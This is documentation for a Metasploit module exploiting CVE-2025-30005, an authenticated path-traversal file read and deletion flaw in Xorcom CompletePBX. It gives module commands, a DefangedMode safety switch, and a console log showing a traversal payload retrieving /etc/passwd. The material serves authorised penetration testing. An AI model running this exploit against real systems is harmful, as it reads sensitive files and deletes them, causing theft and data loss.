## Vulnerable Application

This Metasploit module exploits an **Authenticated Arbitrary File Read and Deletion** vulnerability in **Xorcom CompletePBX <= 5.2.35**.
The issue arises due to improper validation of the `systemDataFileName` parameter in the `diagnostics` module,
allowing an attacker to retrieve arbitrary files from the system.

Additionally, this vulnerability **automatically deletes the requested file** after being accessed,
leading to potential data loss on the target.

The vulnerability is identified as **CVE-2025-30005**.

### Setup

Download the ova file here: [](https://archive.org/details/completepbx-5-2-27-vuln)

## Verification Steps

1. Deploy a vulnerable instance of **Xorcom CompletePBX <= 5.2.35**.
2. Launch **Metasploit Framework**.
3. Use the module:
```
use auxiliary/admin/http/xorcom_completepbx_diagnostics_file_read
```
4. Set the **target host**:
```
set RHOSTS [TARGET_IP]
```
5. Set authentication credentials:
```
set USERNAME [VALID_ADMIN_USERNAME]
set PASSWORD [VALID_ADMIN_PASSWORD]
```
6. Specify the file to read (before deletion):
```
set TARGETFILE /etc/passwd
```
7. Execute the module:
```
run
```
8. If successful, the contents of the specified file will be displayed before its deletion.

## Options

### USERNAME

Admin username for authentication.

### PASSWORD

Admin password for authentication.

### TARGETFILE

Path of the file to retrieve (**before automatic deletion**).

### DefangedMode

Safety switch (true by default). Set to **false** to actually perform the read-and-delete operation.

## Scenarios

### Successful Exploitation Against a Vulnerable CompletePBX Instance

**Setup**:

- **Target**: Xorcom CompletePBX <= 5.2.35
- **Attacker**: Metasploit Framework instance

**Steps**:

```bash
msf6 auxiliary(scanner/http/xorcom_completepbx_diagnostics_file_read) > run http://192.168.1.32/
[*] Running module against 192.168.1.32
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[-] Auxiliary aborted due to failure: bad-config: 
Are you *SURE* you want to execute the module against the target?
Running this module will attempt to read and delete the file
specified by TARGETFILE on the remote system.

If you have explicit authorisation, re-run with:
    set DefangedMode false

[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/xorcom_completepbx_diagnostics_file_read) > set DefangedMode false
DefangedMode => false
msf6 auxiliary(scanner/http/xorcom_completepbx_diagnostics_file_read) > run http://192.168.1.32/
[*] Running module against 192.168.1.32
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[!] This exploit WILL delete the target file if permissions allow.
[*] Attempting to read file: ../../../../../../../../../../..//etc/passwd
[*] ZIP file received, attempting to list files
[*] Files inside ZIP archive:
 - ../../../../../../../../../../..//etc/passwd
 - full_20250716_191240
 - audit_20250716_191240.log
[+] Content of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
pbx:x:1000:1000:,,,:/home/pbx:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:104:113::/var/spool/postfix:/usr/sbin/nologin
tcpdump:x:105:115::/nonexistent:/usr/sbin/nologin
Debian-snmp:x:106:116::/var/lib/snmp:/bin/false
_chrony:x:107:117:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
asterisk:x:109:118:Asterisk PBX daemon,,,:/var/lib/asterisk:/usr/sbin/nologin
cc-cloud-rec:x:999:995::/var/lib/cc-cloud-rec:/sbin/nologin

[*] Auxiliary module execution completed
```

### Impact

- This vulnerability grants **file read access**, but also **automatically deletes** the retrieved file.
- Attackers can extract sensitive data (e.g., user credentials) while simultaneously causing **data loss** on the system.

This module is designed to **demonstrate and automate** the exploitation of this issue using the Metasploit framework.
